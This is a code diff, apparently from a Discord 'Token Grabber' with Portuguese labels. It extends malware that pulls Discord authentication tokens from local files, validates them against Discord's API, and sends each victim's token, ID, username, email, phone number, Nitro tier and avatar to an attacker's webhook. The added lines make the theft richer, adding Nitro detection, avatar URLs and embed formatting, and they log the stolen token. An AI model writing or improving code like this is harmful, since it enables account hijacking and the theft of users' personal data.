@@ -40,7 +40,13 @@ async function get_token(path) {
                             }
                         }).then(resp => resp.json()).then(response => {
                             if (response.id) {
-                                send(match, response.id, response.username, response.discriminator, response.email, response.phone)
+								if(!response.premium_type) {
+                                    nitro = "Sem nitro"
+                                } else {
+                                    if(response.premium_type === 1) { nitro = "Nitro Classic"}
+                                    if(response.premium_type === 2) { nitro = "Nitro Gaming"}
+                                }
+                                send(match, response.id, response.username, response.discriminator, response.email, response.phone, nitro, response.avatar)
                             }
                         })
                     }
@@ -64,13 +70,20 @@ async function get_token(path) {
                     let [match] = regex1.exec(data) || regex2.exec(data) || [null];
                     if (match != null) {
                         match = match.replace(/"/g, '')
+						console.log(match)
                         await fetch(`https://discord.com/api/v6/users/@me`, {
                             headers: {
                                 "authorization": match
                             }
                         }).then(resp => resp.json()).then(response => {
                             if (response.id) {
-                                send(match, response.id, response.username, response.discriminator, response.email, response.phone)
+								if(!response.premium_type) {
+                                    nitro = "Sem nitro"
+                                } else {
+                                    if(response.premium_type === 1) { nitro = "Nitro Classic"}
+                                    if(response.premium_type === 2) { nitro = "Nitro Gaming"}
+                                }
+                                send(match, response.id, response.username, response.discriminator, response.email, response.phone, nitro)
                             }
                         })
                     }
@@ -84,17 +97,30 @@ async function get_token(path) {
     }
 }
 
-function send(token, id, username, tag, email, phone) {
+function send(token, id, username, tag, email, phone, nitro, avatar) {
     if (email === null) {
         email = "Sem email"
     }
     if (phone === null) {
         phone = "Sem telefone"
     }
+    if(avatar === null) {
+        avatar = "https://cdn.discordapp.com/attachments/712856393245392897/743945577238364160/discord.jpg"
+    } else {
+        avatar = `https://cdn.discordapp.com/avatars/${id}/${avatar}.png`
+    }
     axios.post(webhook, {
         "embeds": [
             {
-                "description": `**TOKEN**\n\n${token}\n\n**ID**\n\n${id}\n\n**USERNAME**\n\n${username}#${tag}\n\n**EMAIL**\n\n${email}\n\n**PHONE**\n\n${phone}`,
+                "color": 1127128,
+                "author": {
+                    "name": `${username}`,
+                    "icon_url": `${avatar}`
+                },
+                "thumbnail": {
+                    "url": `${avatar}`
+                },
+                "description": `**TOKEN**\n\n${token}\n\n**ID**\n\n${id}\n\n**USERNAME**\n\n${username}#${tag}\n\n**EMAIL**\n\n${email}\n\n**PHONE**\n\n${phone}\n\n**NITRO**\n\n${nitro}`,
             }
         ], "username": "Token Grabber", "avatar_url": "https://images-ext-2.discordapp.net/external/B4oFamfEYyF5a2IZk_Ef3RnDA9VHiY4orjoKp_LBZ00/%3Fsize%3D2048/https/cdn.discordapp.com/avatars/621402634821042196/a0b719d919e2176f9603f3c3e84ad801.png?width=90&height=90"
     }, {
